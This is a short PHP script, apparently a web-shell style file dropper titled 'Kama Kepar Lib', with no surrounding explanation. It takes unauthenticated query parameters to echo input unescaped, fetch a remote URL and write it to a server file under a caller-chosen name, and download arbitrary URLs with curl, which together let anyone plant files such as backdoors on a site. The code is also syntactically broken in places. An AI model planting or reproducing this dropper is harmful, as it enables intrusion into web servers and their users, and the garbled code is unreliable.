<title>Kama Kepar Lib</title>
<?php
if (isset($_GET["echo"])) {
$echo = $_GET['echo'];
echo $echo;
}
if (isset($_GET["file"])) {
  $ff=$_GET['file'];
  $url = $_GET['url'].$ff;
  $file = fopen ($url, "r");
  echo $file;
  $myfile = fopen($ff, "w");
  fwrite($myfile, $file);
  fclose($myfile);
}
if (isset($_GET["download"])) {
  $source = $_GET['download'];
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $source);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSLVERSION,3);
  data = curl_exec ($ch);
  $error = curl_error($ch); 
  curl_close ($ch);
  echo $data;
  $ch = curl_init($download);
  curl_setopt($ch, CURLOPT_FILE, $data);
  curl_exec($ch);
  $st_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  if($st_code == 200)
    echo 'File downloaded successfully!';
  else
    echo 'Error downloading file!';
?>
